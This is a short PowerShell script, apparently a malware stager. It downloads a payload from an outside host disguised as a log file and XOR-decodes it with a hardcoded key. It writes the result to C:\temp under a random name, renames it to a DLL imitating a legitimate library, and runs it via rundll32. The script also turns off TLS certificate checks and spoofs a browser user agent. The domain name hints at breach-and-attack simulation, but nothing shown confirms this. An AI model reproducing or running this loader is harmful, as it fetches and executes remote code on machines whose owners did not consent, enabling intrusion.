if ( -not (Test-Path -Path C:\temp) ){ New-Item -Path C:\temp -ItemType Directory };
$wc=New-Object System.Net.WebClient;$wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0");$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;
$k="alwiDasd";
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true };
$i=0;[byte[]]$b=([byte[]]($wc.DownloadData("https://01.bas-cluster.com:443/public/events.log")))|%{$_-bxor$k[$i++%$k.length]};
Add-Content -Path "C:\temp\erraticness-micropterygious.log" -Value $b -Encoding Byte;
if ( Test-Path -Path C:\temp\libnettle-8.dll ){ remove-Item -Path C:\temp\libnettle-8.dll -Force};
Rename-Item C:\temp\erraticness-micropterygious.log C:\temp\libnettle-8.dll;
rundll32.exe C:\temp\libnettle-8.dll,WaitMe
